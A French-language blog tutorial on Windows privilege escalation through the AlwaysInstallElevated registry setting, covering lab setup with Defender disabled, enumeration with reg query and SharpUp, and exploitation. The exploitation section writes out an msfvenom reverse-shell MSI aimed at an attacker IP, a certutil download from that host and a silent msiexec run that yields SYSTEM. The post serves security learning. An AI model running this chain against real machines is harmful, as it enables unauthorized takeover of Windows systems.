---
title: Windows Privilege Escalation - AlwaysInstallElevated
date: 2024-06-12 22:57:02 -0400
description: AlwaysInstallElevated est un paramètre du registre Windows qui affecte le comportement du service Windows Installer. La vulnérabilité survient lorsque la clé de registre "AlwaysInstallElevated" est configurée avec une valeur de "1" dans le registre Windows.
    Lorsque cette clé de registre est activée, elle permet à des utilisateurs non administrateurs d'installer des logiciels avec des privilèges élevés. En d'autres termes, les utilisateurs qui ne devraient pas avoir de droits d'administration peuvent exploiter cette vulnérabilité pour exécuter du code arbitraire avec des autorisations élevées, ce qui peut compromettre la sécurité du système.
categories: [RedTeam]
tags: [HTB, Windows, THM]
image:
    path: https://i.ibb.co/NKSrMyh/Always-Install-Elevated.png
---


- **[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g)**.
- **[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


## Configuration du Lab

Pour simuler cette vulnérabilité dans un environnement de laboratoire, nous allons configurer notre système de manière à être vulnérable à la mauvaise configuration `AlwaysInstallElevated`. 

- **OS:** *Windows 10*

Pour commencer, je vais d'abord lancer la commande ``Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser`` pour autoriser notre utiliser a executer des scripts dans le SYSTEME.

- Ensuite on desactive le Windows Defender pour ne pas interompre notre apprentissage.

Nous allons maintenant configurer les clés de registre nécessaires pour rendre le système vulnérable. Utilisez le script PowerShell ci-dessous pour configurer les clés de registre `AlwaysInstallElevated` :

```powershell
$global:version = "1.0.0"

$ascii = @"

.____                        .__            .____          ___.     _________       __                
|    |    ____   ____ _____  |  |           |    |   _____ \_ |__  /   _____/ _____/  |_ __ ________  
|    |   /  _ \_/ ___\\__  \ |  |    ______ |    |   \__  \ | __ \ \_____  \_/ __ \   __\  |  \____ \ 
|    |__(  <_> )  \___ / __ \|  |__ /_____/ |    |___ / __ \| \_\ \/        \  ___/|  | |  |  /  |_> >
|_______ \____/ \___  >____  /____/         |_______ (____  /___  /_______  /\___  >__| |____/|   __/ 
        \/          \/     \/                       \/    \/    \/        \/     \/           |__|    

~ Created with <3 by @nickvourd
~ Version: $global:version
~ Type: AlwaysInstallElevated

"@

Write-Host $ascii`n

Write-Host "[+] Configuring HKEY_LOCAL_MACHINE registry`n"
#Create a new key in HKEY_LOCAL_MACHINE registry
New-Item -Path "Registry::\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer"

#Create a new DWORD (32-Bit) Value and insert hex data
New-ItemProperty -Path "Registry::\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -PropertyType DWORD -Value 0x00000001

Write-Host "`n[+] Configuring HKEY_CURRENT_USER registry`n"
#Create a new key in HKEY_CURRENT_USER registry
New-Item -Path "Registry::\HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer"

#Create a new DWORD (32-Bit) Value and insert hex data
New-ItemProperty -Path "Registry::\HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -PropertyType DWORD -Value 0x00000001
```

## Enumeration && Exploitation

Imaginez alors qu'on a un acces utilisateur sur une Machine Windows comme ici:

![FootHold](https://i.ibb.co/jGXfy1w/1.png)

- Pour faire l'enumeration j'utilise 2 Methodes, dont la premiere est Manuellement et la seconde avec un outil `SharpUp`:


### Enumeration(Manuellement)
Pour vérifier manuellement si les clés de registre `AlwaysInstallElevated` sont activées, on utilise ces 2 commandes.

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

> Si ces 2 registres sont activés (la valeur est `0x1`), alors les utilisateurs de tout privilège peuvent installer et exécuter des fichiers ``.msi`` en tant que **NT AUTHORITY\SYSTEM**.
{: .prompt-info }

![Query](https://i.ibb.co/6myrDw0/3.png)


### Enumeration (`SharpUP`)
**SharpUp** est un outil qui permet d'automatiser l'énumération des vulnérabilités sur les systèmes Windows.
Pour Telecharger SharpUP vous pouvez le trouver dans Ressources supplementaires en bas de cette poste:

- D'abord on le telecharge sur la machine victime puis on lance:

![SharpUP.exe](https://i.ibb.co/tBXd9Fs/4.png)

Sur la photo on vois qu'on peux lancer SharpUP avec 2 options. 
- La premiere c'est `audit` et puis la vulnerabilite qu'on voudrais checker

![vulnerable](https://i.ibb.co/wrCPxhv/5.png)

Donc ici on vois bien que rien a changer et la valeur est toujours sur `0x1` en hexa, ce qui veux dire que notre systeme victime est vulnerable.


## Exploitation de la Vulnérabilité

Une fois que nous avons confirmé que les clés de registre `AlwaysInstallElevated` sont activées, nous pouvons exploiter cette vulnérabilité pour obtenir des privilèges élevés.
Pour exploiter cette vulnerabilite et avoir les privilege *Administrateur* dans l'ordinateur victime, c'est simple. Il faut:

- **Premierement**: Creer un fichier Malveillant en `.msi`
Pour cela j'utilise `msfvenom`

```sh
$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=1337 -f msi -o rev.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: rev.msi
```

Ensuite, on transfere ce fichier Malveillant sur la Machine Victime

```sh
C:\Users\bloman\Desktop>certutil -urlcache -f http://192.168.56.1/rev.msi rev.msi
certutil -urlcache -f http://192.168.56.1/rev.msi rev.msi
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\bloman\Desktop>
```
- Puis d'executer l'installation du fichier malveillant `.msi` en arriere plan avec l'outil `msiexec` tout en ouvrant notre Listner `netcat`

```sh
msiexec /quiet /qn /i fichier.msi
```

![NT Authority](https://i.ibb.co/Ph8C0TX/6.png)


## Ressources supplementaires
Voici quelques ressources supplémentaires qui pourraient vous être utiles :
- [SharpUP](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- [Hacktricks WIndows hardening](https://book.hacktricks.xyz/v/fr/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated)
- [Join Us on Discord](https://discord.gg/wBT9wr9ruG).
